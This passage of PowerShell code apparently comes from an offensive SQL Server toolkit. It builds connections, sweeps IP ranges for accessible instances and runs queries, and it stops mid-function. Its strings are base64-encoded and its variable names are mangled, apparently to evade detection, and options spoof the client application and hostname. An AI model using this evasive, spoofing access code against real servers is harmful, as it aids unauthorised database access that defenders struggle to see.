Function Get-SQLConnectionObject
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Dedicated Administrator Connection (DAC).')]
        [Switch]$DAC,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Default database to connect to.')]
        [String]$Database,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Spoof the name of the application your connecting to the server with.')]
        [string]$AppName = "",
        [Parameter(Mandatory = $false,
        HelpMessage = 'Spoof the name of the workstation/hostname your connecting to the server with.')]
        [string]$WorkstationId = "",
        [Parameter(Mandatory = $false,
        HelpMessage = 'Use an encrypted connection.')]
        [ValidateSet("Yes","No","")]
        [string]$Encrypt = "",
        [Parameter(Mandatory = $false,
        HelpMessage = 'Trust the certificate of the remote server.')]
        [ValidateSet("Yes","No","")]
        [string]$TrustServerCert = "",
        [Parameter(Mandatory = $false,
        HelpMessage = 'Connection timeout.')]
        [string]$TimeOut = 1
    )
    Begin
    {
        if($DAC)
        {
            ${/=\/====\_/\/\__/} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBEAE0ASQBOADoA')))
        }
        else
        {
            ${/=\/====\_/\/\__/} = ''
        }
        if(-not $Database)
        {
            $Database = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAHMAdABlAHIA')))
        }
        if($AppName){
            ${/=\/\/\/==\_/==\_} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('OwBBAHAAcABsAGkAYwBhAHQAaQBvAG4AIABOAGEAbQBlAD0AIgAkAEEAcABwAE4AYQBtAGUAIgA=')))
        }else{
            ${/=\/\/\/==\_/==\_} = ""
        }
        if($WorkstationId){
            ${______/====\/\_/\} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('OwBXAG8AcgBrAHMAdABhAHQAaQBvAG4AIABJAGQAPQAiACQAVwBvAHIAawBzAHQAYQB0AGkAbwBuAEkAZAAiAA==')))
        }else{
            ${______/====\/\_/\} = ""
        }
        if($Encrypt){
            ${/===\_/===\_/===\} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('OwBFAG4AYwByAHkAcAB0AD0AWQBlAHMA')))
        }else{
            ${/===\_/===\_/===\} = ""
        }
        if($TrustServerCert){
            ${/=\/\_/=\_/\/\_/\} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('OwBUAHIAdQBzAHQAUwBlAHIAdgBlAHIAQwBlAHIAdABpAGYAaQBjAGEAdABlAD0AWQBlAHMA')))
        }else{
            ${/=\/\_/=\_/\/\_/\} = ""
        }
    }
    Process
    {
        if ( -not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }
        ${__/=\____/\__/==\} = New-Object -TypeName System.Data.SqlClient.SqlConnection
        if(-not $Username){
            ${__/\_/\____/\/\_/} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwB1AHIAcgBlAG4AdAAgAFcAaQBuAGQAbwB3AHMAIABDAHIAZQBkAGUAbgB0AGkAYQBsAHMA')))
            ${__/=\____/\__/==\}.ConnectionString = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAPQAkAHsALwA9AFwALwA9AD0APQA9AFwAXwAvAFwALwBcAF8AXwAvAH0AJABJAG4AcwB0AGEAbgBjAGUAOwBEAGEAdABhAGIAYQBzAGUAPQAkAEQAYQB0AGEAYgBhAHMAZQA7AEkAbgB0AGUAZwByAGEAdABlAGQAIABTAGUAYwB1AHIAaQB0AHkAPQBTAFMAUABJADsAQwBvAG4AbgBlAGMAdABpAG8AbgAgAFQAaQBtAGUAbwB1AHQAPQAkAFQAaQBtAGUATwB1AHQAJAB7AC8APQBcAC8AXAAvAFwALwA9AD0AXABfAC8APQA9AFwAXwB9ACQAewAvAD0APQA9AFwAXwAvAD0APQA9AFwAXwAvAD0APQA9AFwAfQAkAHsALwA9AFwALwBcAF8ALwA9AFwAXwAvAFwALwBcAF8ALwBcAH0AJAB7AF8AXwBfAF8AXwBfAC8APQA9AD0APQBcAC8AXABfAC8AXAB9AA==')))
        }
        if ($username -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgBcACoA')))){
            ${__/\_/\____/\/\_/} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AdgBpAGQAZQBkACAAVwBpAG4AZABvAHcAcwAgAEMAcgBlAGQAZQBuAHQAaQBhAGwAcwA=')))
            ${__/=\____/\__/==\}.ConnectionString = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAPQAkAHsALwA9AFwALwA9AD0APQA9AFwAXwAvAFwALwBcAF8AXwAvAH0AJABJAG4AcwB0AGEAbgBjAGUAOwBEAGEAdABhAGIAYQBzAGUAPQAkAEQAYQB0AGEAYgBhAHMAZQA7AEkAbgB0AGUAZwByAGEAdABlAGQAIABTAGUAYwB1AHIAaQB0AHkAPQBTAFMAUABJADsAdQBpAGQAPQAkAFUAcwBlAHIAbgBhAG0AZQA7AHAAdwBkAD0AJABQAGEAcwBzAHcAbwByAGQAOwBDAG8AbgBuAGUAYwB0AGkAbwBuACAAVABpAG0AZQBvAHUAdAA9ACQAVABpAG0AZQBPAHUAdAAkAHsALwA9AFwALwBcAC8AXAAvAD0APQBcAF8ALwA9AD0AXABfAH0AJAB7AC8APQA9AD0AXABfAC8APQA9AD0AXABfAC8APQA9AD0AXAB9ACQAewAvAD0AXAAvAFwAXwAvAD0AXABfAC8AXAAvAFwAXwAvAFwAfQAkAHsAXwBfAF8AXwBfAF8ALwA9AD0APQA9AFwALwBcAF8ALwBcAH0A')))
        }
        if (($username) -and ($username -notlike $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgBcACoA'))))){
            ${__/\_/\____/\/\_/} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AdgBpAGQAZQBkACAAUwBRAEwAIABMAG8AZwBpAG4A')))
            ${__/=\____/\__/==\}.ConnectionString = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAPQAkAHsALwA9AFwALwA9AD0APQA9AFwAXwAvAFwALwBcAF8AXwAvAH0AJABJAG4AcwB0AGEAbgBjAGUAOwBEAGEAdABhAGIAYQBzAGUAPQAkAEQAYQB0AGEAYgBhAHMAZQA7AFUAcwBlAHIAIABJAEQAPQAkAFUAcwBlAHIAbgBhAG0AZQA7AFAAYQBzAHMAdwBvAHIAZAA9ACQAUABhAHMAcwB3AG8AcgBkADsAQwBvAG4AbgBlAGMAdABpAG8AbgAgAFQAaQBtAGUAbwB1AHQAPQAkAFQAaQBtAGUATwB1AHQAJAB7AC8APQBcAC8AXAAvAFwALwA9AD0AXABfAC8APQA9AFwAXwB9ACQAewAvAD0APQA9AFwAXwAvAD0APQA9AFwAXwAvAD0APQA9AFwAfQAkAHsALwA9AFwALwBcAF8ALwA9AFwAXwAvAFwALwBcAF8ALwBcAH0AJAB7AF8AXwBfAF8AXwBfAC8APQA9AD0APQBcAC8AXABfAC8AXAB9AA==')))
        }
        return ${__/=\____/\__/==\}
    }
    End
    {
    }
}
Function  Get-SQLConnectionTest
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        [Parameter(Mandatory = $false,
                ValueFromPipeline = $true,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,
        [Parameter(Mandatory = $false,
            ValueFromPipeline = $true,
            ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'IP Address of SQL Server.')]
        [string]$IPAddress,
        [Parameter(Mandatory = $false,
        HelpMessage = 'IP Address Range In CIDR Format to Audit.')]
        [string]$IPRange,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Connect using Dedicated Admin Connection.')]
        [Switch]$DAC,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Default database to connect to.')]
        [String]$Database,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Connection timeout.')]
        [string]$TimeOut,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )
    Begin
    {
        ${/=\_____/\/\/=\__} = New-Object -TypeName System.Data.DataTable
        $null = ${/=\_____/\/\/=\__}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))))
        $null = ${/=\_____/\/\/=\__}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHMAdABhAG4AYwBlAA=='))))
        $null = ${/=\_____/\/\/=\__}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AGEAdAB1AHMA'))))
    }
    Process
    {
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }
        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance
        if($IPRange -and $IPAddress)
        {
            if ($IPAddress.Contains(","))
            {
                ${__/=\/==\/\/\/\_/} = $false
                foreach ($IP in $IPAddress.Split(","))
                {
                    if($(Test-Subnet -cidr $IPRange -ip $IP))
                    {
                        ${__/=\/==\/\/\/\_/} = $true
                    }
                }
                if (-not ${__/=\/==\/\/\/\_/})
                {
                    Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBrAGkAcABwAGkAbgBnACAAJABDAG8AbQBwAHUAdABlAHIATgBhAG0AZQAgACgAJABJAFAAQQBkAGQAcgBlAHMAcwApAA==')))
                    $null = ${/=\_____/\/\/=\__}.Rows.Add($ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABDAG8AbQBwAHUAdABlAHIATgBhAG0AZQA='))),$ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwB1AHQAIABvAGYAIABTAGMAbwBwAGUA'))))
                    return
                }
            }
            if(-not $(Test-Subnet -cidr $IPRange -ip $IPAddress))
            {
                Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBrAGkAcABwAGkAbgBnACAAJABDAG8AbQBwAHUAdABlAHIATgBhAG0AZQAgACgAJABJAFAAQQBkAGQAcgBlAHMAcwApAA==')))
                $null = ${/=\_____/\/\/=\__}.Rows.Add($ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABDAG8AbQBwAHUAdABlAHIATgBhAG0AZQA='))),$ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwB1AHQAIABvAGYAIABTAGMAbwBwAGUA'))))
                return
            }
            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABDAG8AbQBwAHUAdABlAHIATgBhAG0AZQAgACgAJABJAFAAQQBkAGQAcgBlAHMAcwApAA==')))
        }
        if($DAC)
        {
            ${__/=\____/\__/==\} = Get-SQLConnectionObject -Instance $Instance -Username $Username -Password $Password -Credential $Credential -DAC -TimeOut $TimeOut -Database $Database
        }
        else
        {
            ${__/=\____/\__/==\} = Get-SQLConnectionObject -Instance $Instance -Username $Username -Password $Password -Credential $Credential -TimeOut $TimeOut -Database $Database
        }
        try
        {
            ${__/=\____/\__/==\}.Open()
            if(-not $SuppressVerbose)
            {
                Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAQwBvAG4AbgBlAGMAdABpAG8AbgAgAFMAdQBjAGMAZQBzAHMALgA=')))
            }
            $null = ${/=\_____/\/\/=\__}.Rows.Add($ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABDAG8AbQBwAHUAdABlAHIATgBhAG0AZQA='))),$ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGMAZQBzAHMAaQBiAGwAZQA='))))
            ${__/=\____/\__/==\}.Close()
            ${__/=\____/\__/==\}.Dispose()
        }
        catch
        {
            if(-not $SuppressVerbose)
            {
                ${/=\_______/===\__} = $_.Exception.Message
                Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAQwBvAG4AbgBlAGMAdABpAG8AbgAgAEYAYQBpAGwAZQBkAC4A')))
                Write-Verbose  -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IABFAHIAcgBvAHIAOgAgACQAewAvAD0AXABfAF8AXwBfAF8AXwBfAC8APQA9AD0AXABfAF8AfQA=')))
            }
            $null = ${/=\_____/\/\/=\__}.Rows.Add($ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABDAG8AbQBwAHUAdABlAHIATgBhAG0AZQA='))),$ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBvAHQAIABBAGMAYwBlAHMAcwBpAGIAbABlAA=='))))
        }
    }
    End
    {
        ${/=\_____/\/\/=\__}
    }
}
Function  Get-SQLConnectionTestThreaded
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        [Parameter(Mandatory = $false,
                ValueFromPipeline = $true,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,
        [Parameter(Mandatory = $false,
            ValueFromPipeline = $true,
            ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'IP Address of SQL Server.')]
        [string]$IPAddress,
        [Parameter(Mandatory = $false,
        HelpMessage = 'IP Address Range In CIDR Format to Audit.')]
        [string]$IPRange,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Connect using Dedicated Admin Connection.')]
        [Switch]$DAC,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Default database to connect to.')]
        [String]$Database,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Connection timeout.')]
        [string]$TimeOut,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Number of threads.')]
        [int]$Threads = 5,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )
    Begin
    {
        ${/=\_____/\/\/=\__} = New-Object -TypeName System.Data.DataTable
        $null = ${/=\_____/\/\/=\__}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))))
        $null = ${/=\_____/\/\/=\__}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHMAdABhAG4AYwBlAA=='))))
        $null = ${/=\_____/\/\/=\__}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AGEAdAB1AHMA'))))
        ${____/\/=\_/\/===\} = New-Object -TypeName System.Data.DataTable
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }
        if($Instance)
        {
            ${_/\/=\/=\/\/\____} = New-Object -TypeName PSObject -Property @{
                Instance = $Instance;
            }
        }
        if($Instance -and $IPAddress)
        {
            ${_/\/=\/=\/\/\____} | Add-Member -Name $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBQAEEAZABkAHIAZQBzAHMA'))) -Value $IPAddress
        }
        ${____/\/=\_/\/===\} = ${____/\/=\_/\/===\} + ${_/\/=\/=\/\/\____}
    }
    Process
    {
        ${____/\/=\_/\/===\} = ${____/\/=\_/\/===\} + $_
    }
    End
    {
        ${____/\__/\_/=\__/} = {
            $Instance = $_.Instance
            $IPAddress = $_.IPAddress
            $ComputerName = Get-ComputerNameFromInstance -Instance $Instance
            if($IPRange -and $IPAddress)
            {
                if ($IPAddress.Contains(","))
                {
                    ${__/=\/==\/\/\/\_/} = $false
                    foreach ($IP in $IPAddress.Split(","))
                    {
                        if($(Test-Subnet -cidr $IPRange -ip $IP))
                        {
                            ${__/=\/==\/\/\/\_/} = $true
                        }
                    }
                    if (-not ${__/=\/==\/\/\/\_/})
                    {
                        Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBrAGkAcABwAGkAbgBnACAAJABDAG8AbQBwAHUAdABlAHIATgBhAG0AZQAgACgAJABJAFAAQQBkAGQAcgBlAHMAcwApAA==')))
                        $null = ${/=\_____/\/\/=\__}.Rows.Add($ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABDAG8AbQBwAHUAdABlAHIATgBhAG0AZQA='))),$ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwB1AHQAIABvAGYAIABTAGMAbwBwAGUA'))))
                        return
                    }
                }
                if(-not $(Test-Subnet -cidr $IPRange -ip $IPAddress))
                {
                    Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBrAGkAcABwAGkAbgBnACAAJABDAG8AbQBwAHUAdABlAHIATgBhAG0AZQAgACgAJABJAFAAQQBkAGQAcgBlAHMAcwApAA==')))
                    $null = ${/=\_____/\/\/=\__}.Rows.Add($ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABDAG8AbQBwAHUAdABlAHIATgBhAG0AZQA='))),$ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwB1AHQAIABvAGYAIABTAGMAbwBwAGUA'))))
                    return
                }
                Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABDAG8AbQBwAHUAdABlAHIATgBhAG0AZQAgACgAJABJAFAAQQBkAGQAcgBlAHMAcwApAA==')))
            }
            if($DAC)
            {
                ${__/=\____/\__/==\} = Get-SQLConnectionObject -Instance $Instance -Username $Username -Password $Password -Credential $Credential -DAC -TimeOut $TimeOut -Database $Database
            }
            else
            {
                ${__/=\____/\__/==\} = Get-SQLConnectionObject -Instance $Instance -Username $Username -Password $Password -Credential $Credential -TimeOut $TimeOut -Database $Database
            }
            try
            {
                ${__/=\____/\__/==\}.Open()
                if(-not $SuppressVerbose)
                {
                    Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAQwBvAG4AbgBlAGMAdABpAG8AbgAgAFMAdQBjAGMAZQBzAHMALgA=')))
                }
                $null = ${/=\_____/\/\/=\__}.Rows.Add($ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABDAG8AbQBwAHUAdABlAHIATgBhAG0AZQA='))),$ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGMAZQBzAHMAaQBiAGwAZQA='))))
                ${__/=\____/\__/==\}.Close()
                ${__/=\____/\__/==\}.Dispose()
            }
            catch
            {
                if(-not $SuppressVerbose)
                {
                    ${/=\_______/===\__} = $_.Exception.Message
                    Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAQwBvAG4AbgBlAGMAdABpAG8AbgAgAEYAYQBpAGwAZQBkAC4A')))
                }
                $null = ${/=\_____/\/\/=\__}.Rows.Add($ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABDAG8AbQBwAHUAdABlAHIATgBhAG0AZQA='))),$ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBvAHQAIABBAGMAYwBlAHMAcwBpAGIAbABlAA=='))))
            }
        }
        ${____/\/=\_/\/===\} | Invoke-Parallel -ScriptBlock ${____/\__/\_/=\__/} -ImportSessionFunctions -ImportVariables -Throttle $Threads -RunspaceTimeout 2 -Quiet -ErrorAction SilentlyContinue
        return ${/=\_____/\/\/=\__}
    }
}
Function Get-SQLQuery
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server query.')]
        [string]$Query,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Connect using Dedicated Admin Connection.')]
        [Switch]$DAC,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Default database to connect to.')]
        [String]$Database,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Connection timeout.')]
        [int]$TimeOut,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Spoof the name of the application your connecting to the server with.')]
        [string]$AppName = "",
        [Parameter(Mandatory = $false,
        HelpMessage = 'Spoof the name of the workstation/hostname your connecting to the server with.')]
        [string]$WorkstationId = "",
        [Parameter(Mandatory = $false,
        HelpMessage = 'Use an encrypted connection.')]
        [ValidateSet("Yes","No","")]
        [string]$Encrypt = "",
        [Parameter(Mandatory = $false,
        HelpMessage = 'Trust the certificate of the remote server.')]
        [ValidateSet("Yes","No","")]
        [string]$TrustServerCert = "",
        [Parameter(Mandatory = $false,
        HelpMessage = 'Return error message if exists.')]
        [switch]$ReturnError
    )
    Begin
    {
        ${_/==\_____/\/==\_} = New-Object -TypeName System.Data.DataTable
    }
    Process
    {
        if($DAC)
        {
            ${__/=\____/\__/==\} = Get-SQLConnectionObject -Instance $Instance -Username $Username -Password $Password -Credential $Credential -TimeOut $TimeOut -DAC -Database $Database -AppName $AppName -WorkstationId $WorkstationId -Encrypt $Encrypt -TrustServerCert $TrustServerCert
        }
        else
        {
            ${__/=\____/\__/==\} = Get-SQLConnectionObject -Instance $Instance -Username $Username -Password $Password -Credential $Credential -TimeOut $TimeOut -Database $Database -AppName $AppName -WorkstationId $WorkstationId -Encrypt $Encrypt -TrustServerCert $TrustServerCert
        }
        ${_/=\/==\/===\/\/=} = ${__/=\____/\__/==\}.Connectionstring
        $Instance = ${_/=\/==\/===\/\/=}.split(';')[0].split('=')[1]
        if($Query)
        {
            try
            {
                ${__/=\____/\__/==\}.Open()
                if(-not $SuppressVerbose)
                {
                    Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAQwBvAG4AbgBlAGMAdABpAG8AbgAgAFMAdQBjAGMAZQBzAHMALgA=')))
                }
                $Command = New-Object -TypeName System.Data.SqlClient.SqlCommand -ArgumentList ($Query, ${__/=\____/\__/==\})
                ${__/\/=\/=\/\/\_/\} = $Command.ExecuteReader()
                ${_/==\_____/\/==\_}.Load(${__/\/=\/=\/\/\_/\})
                ${__/=\____/\__/==\}.Close()
                ${__/=\____/\__/==\}.Dispose()
            }
            catch
            {
                if(-not $SuppressVerbose)
                {
                    Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAQwBvAG4AbgBlAGMAdABpAG8AbgAgAEYAYQBpAGwAZQBkAC4A')))
                }
                if($ReturnError)
                {
                    ${/=\_______/===\__} = $_.Exception.Message
                }
            }
        }
        else
        {
            Write-Host -InputObject $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBvACAAcQB1AGUAcgB5ACAAcAByAG8AdgBpAGQAZQBkACAAdABvACAARwBlAHQALQBTAFEATABRAHUAZQByAHkAIABmAHUAbgBjAHQAaQBvAG4ALgA=')))
            Break
        }
    }
    End
    {
        if($ReturnError)
        {
            ${/=\_______/===\__}
        }
        else
        {
            ${_/==\_____/\/==\_}
        }
    }
}
Function  Get-SQLQueryThreaded
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        [Parameter(Mandatory = $false,
                ValueFromPipeline = $true,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Connect using Dedicated Admin Connection.')]
        [Switch]$DAC,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Default database to connect to.')]
        [String]$Database,
        [Parameter(Mandatory = $true,
        HelpMessage = 'Query to be executed.')]
        [String]$Query,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Connection timeout.')]
        [string]$TimeOut,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Number of threads.')]
        [int]$Threads = 5,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )
    Begin
    {
        ${/=\_____/\/\/=\__} = New-Object -TypeName System.Data.DataTable
        ${____/\/=\_/\/===\} = New-Object -TypeName System.Data.DataTable
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }
        if($Instance)
        {
            ${_/\/=\/=\/\/\____} = New-Object -TypeName PSObject -Property @{
                Instance = $Instance
            }
        }
        ${____/\/=\_/\/===\} = ${____/\/=\_/\/===\} + ${_/\/=\/=\/\/\____}
    }
    Process
    {
        ${____/\/=\_/\/===\} = ${____/\/=\_/\/===\} + $_
    }
    End
    {
        ${____/\__/\_/=\__/} = {
            $Instance = $_.Instance
            $ComputerName = Get-ComputerNameFromInstance -Instance $Instance
            if($DAC)
            {
                ${__/=\____/\__/==\} = Get-SQLConnectionObject -Instance $Instance -Username $Username -Password $Password -Credential $Credential -DAC -TimeOut $TimeOut -Database $Database
            }
            else
            {
                ${__/=\____/\__/==\} = Get-SQLConnectionObject -Instance $Instance -Username $Username -Password $Password -Credential $Credential -TimeOut $TimeOut -Database $Database
            }
            try
            {
                ${__/=\____/\__/==\}.Open()
                if(-not $SuppressVerbose)
                {
